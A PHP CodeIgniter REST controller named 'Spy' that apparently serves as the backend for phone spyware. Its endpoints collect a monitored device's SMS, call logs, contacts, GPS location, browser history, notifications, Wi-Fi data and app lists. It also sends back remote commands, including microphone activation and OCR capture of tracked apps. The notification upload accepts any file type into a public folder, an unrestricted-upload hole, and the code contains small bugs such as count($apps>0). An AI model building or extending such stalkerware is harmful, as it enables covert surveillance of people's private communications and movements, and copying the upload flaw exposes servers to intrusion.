<?php   defined('BASEPATH') or exit('No direct script access allowed');

// This can be removed if you use __autoload() in config.php OR use Modular Extensions
require APPPATH . '/libraries/REST_Controller.php';


class Spy extends REST_Controller
{
    function __construct()
    {
    	
        parent::__construct();
        $this->load->helper('url');
        $this->load->helper(array('form', 'url','constant_helper','function_helper'));
        $this->load->model('spy_model'); 
		$this->load->library('email');
		 
		
    }
    
    function deviceInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('device-info',$input_method);
            $device=$this->spy_model->saveDeviceInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              moduleComplete($input_method['uuid'],"Device Info","10");
                 $this->response(array('message' =>SUCCESS,'device_id'=>$device, 'status' => 1), 200);
            }
           
    }
	
	  function smsInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->smsInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              moduleComplete($input_method['device_id'],"SMS sync done","30");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
		  function callLog()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->callLog($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              moduleComplete($input_method['device_id'],"Call Log sync done","40");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
	 	  function contactInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->contactInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
               moduleComplete($input_method['device_id'],"Contact sync done","20");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
		 	  function gpsInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->gpsInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
		 	  function browserHistoryInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->browserHistoryInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              moduleComplete($input_method['device_id'],"Browser history sync done","50");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
	
			 	  function deviceNotification()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
			
			////notice image
			$input_method['file_name']= 'no_image.png';
	  if((isset($_FILES['file']))){
		 
        //----------------------------------------------------------------
        $num = uniqid();
	     $file_name = $num;
		$config['upload_path'] = './upload/noticeimg/';
		$config['allowed_types'] = '*';
	    $config['file_name'] = '"'.$file_name.'"';	

		$this->load->library('upload', $config);

		if ( ! $this->upload->do_upload('file'))
		{
			
   $this -> response(array(
						'message' => strip_tags($this -> upload -> display_errors()),
						'status' => 0
					), 200);
			 
		}
		else
		{
			$data = array('upload_data' => $this->upload->data());
			//// Image data ////
			
		if(isset($data))
        {
         $input_method['file_name']=$data['upload_data']['file_name']; 
		
		 
        }
			
		}
	  }
			///notice image end
			
			
            $device=$this->spy_model->deviceNotification($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
             // moduleComplete($input_method['device_id'],"Notication sync done","50");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
	
			 	  function wifiInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->wifiInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
            	moduleComplete($input_method['device_id'],"WiFi info sync done","80");
              $device=$this->spy_model->deviceReady($input_method);
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
	
		 	  function errorLogs()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->errorLogs($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
             
              
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
			 	  function appInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('spy-info',$input_method);
            $device=$this->spy_model->appInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
               moduleComplete($input_method['device_id'],"App list sync done","65");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
			 	  function mobileIpInfo()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('mobile-ip-info',$input_method);
            $device=$this->spy_model->mobileIpInfo($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
               //moduleComplete($input_method['device_id'],"App list sync done","65");
                 $this->response(array('message' =>SUCCESS, 'status' => 1), 200);
            }
           
    }
	
	
	
	 function deviceToken()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('device-token',$input_method);
            $device=$this->spy_model->saveDeviceToken($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              
                 $this->response(array('message' =>SUCCESS,'device_id'=>$device, 'status' => 1), 200);
            }
           
    }
		function deviceBatteryLevel() {
		$input_method = $this -> webservices_inputs();
		$this -> validate_param('battery-level', $input_method);
		$device = $this -> spy_model -> deviceBatteryLevel($input_method);
		if ($device) {
			$this -> response(array('message' => SUCCESS, 'status' => "1"), 200);
		} else {
			$this -> response(array('message' => FAIL, 'status' => 0), 200);
		}
	}
		
		
	 
	function deviceStatus()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('device-status',$input_method);
			$this->spy_model->saveDeviceOther($input_method);
            $device=$this->spy_model->saveDeviceStatus($input_method);
			 $device_request=$this->spy_model->checkDeviceRequest($input_method);
           if($device_request){
           	$updateStatus = 1;
           }else{
           	$updateStatus = 0;
           }
		   
		   
		    $data_settings = $this->spy_model->get_data_settings($input_method['uuid']);
			$deleteuser = $this->spy_model->deviceDeleted($input_method['uuid']);
	$notification_sync =	$ocr_sync =	$auto_sleep =$auto_sync = $microphone= 0;$time = '00:00';$media_wifi=$media_gsm = 1;
			if(count($data_settings)>0){
				           $auto_sync_on = $auto_sync_off  = 0;
				$time = '';
                 if(isset($data_settings['auto_sync'])){
                	if($data_settings['auto_sync']==1){
                		 $auto_sync = 1;
						 
						$time = date('H:i',strtotime($data_settings['sync_time']));
                	}else{
                		$auto_sync  = 0;
                	}
                }
                $media_both = $media_gsm = $media_wifi = 0;
				    if(isset($data_settings['media_sync'])){
                	if($data_settings['media_sync']==1){
                		 $media_wifi = 1;
						 
                	}else if($data_settings['media_sync']==2){
                		$media_gsm = 1;
                	}                	
                	else{
                		$media_gsm = 1;
						$media_wifi = 1;
                	}
                }
                $microphone_on = $microphone_off = 0;
				if(isset($data_settings['microphone'])){
                	if($data_settings['microphone']==1){
                		 $microphone  = 1;
						 
                	}else{
                		$microphone  = 0;
                	}
                }
				
				
			if(isset($data_settings['auto_sleep'])){
                	if($data_settings['auto_sleep']==1){
                		  $auto_sleep  = 1;
						 
                	}else{
                		 $auto_sleep  = 0;
                	}
                }
				if(isset($data_settings['ocr_sync'])){
                	if($data_settings['ocr_sync']==1){
                		  $ocr_sync  = 1;
						 
                	}else{
                		 $ocr_sync  = 0;
                	}
                }
				
				//notification
				if(isset($data_settings['notification_sync'])){
                	if($data_settings['notification_sync']==1){
                		  $notification_sync  = 1;
						 
                	}else{
                		 $notification_sync  = 0;
                	}
                }
				
				//end notification
			
				
			}
		   
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL,'updateStatus'=>0,    'auto_sync'=> (string) $auto_sync,
                 'sync_time'=>(string) $time,
                 'media_sync_wifi'=>(string) $media_wifi,
                 'auto_sleep'=>(string) $auto_sleep,
                 'ocr_sync'=>(string) $ocr_sync,
                 'deleteuser' => $deleteuser,
                  'mircophone_activate'=>(string) $microphone, 
                  'notification_sync' => (string) $notification_sync,  
                 'media_sync_gsm'=>(string) $media_gsm,  'status' => 0), 200);
            }else{
              $this->spy_model->deleteDeviceRequest($input_method['uuid']);
                 $this->response(array('message' =>SUCCESS,'updateStatus'=>$updateStatus,
                'auto_sync'=> (string) $auto_sync,
                 'sync_time'=>(string) $time,
                 'media_sync_wifi'=>(string) $media_wifi,
                 'auto_sleep'=>(string) $auto_sleep,
                  'ocr_sync'=>(string) $ocr_sync,
                  'deleteuser' => $deleteuser,
                  'mircophone_activate'=>(string) $microphone,  
                      'notification_sync' => (string) $notification_sync,  
                 'media_sync_gsm'=>(string) $media_gsm,                 
                 'status'=> 1), 200);
            }
           
    }
		function deviceReady()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('device-status',$input_method);
            $device=$this->spy_model->deviceReady($input_method);
           
            if(!$device)
            {
            	
				
               $this->response(array('message' => FAIL, 'status' => 0), 200);
            }else{
              
                 $this->response(array('message' =>SUCCESS,'status' => 1), 200);
            }
           
    }
	
	
		function checkDeviceRequest()
    {
    	
		
            $input_method = $this->webservices_inputs();
            $this->validate_param('device-status',$input_method);
            $device=$this->spy_model->checkDeviceRequest($input_method);
           
            if($device)
            {
            	
				
               $this->response(array('message' => "Request for send data!", 'status' => 1), 200);
            }else{
              
                 $this->response(array('message' =>"Don't send data",'status' => 0), 200);
            }
           
    }
	
			function ocrTrackApps()
    {
    	
		 
            $apps=$this->spy_model->ocrTrackApps();
           
            if(count($apps>0))
            {
            	
				
               $this->response(array('message' => "Request for send data!",'data'=>$apps, 'status' => 1), 200);
            }else{
              
                 $this->response(array('message' =>"Don't send data",'status' => 0), 200);
            }
           
    }
   
} 

?>
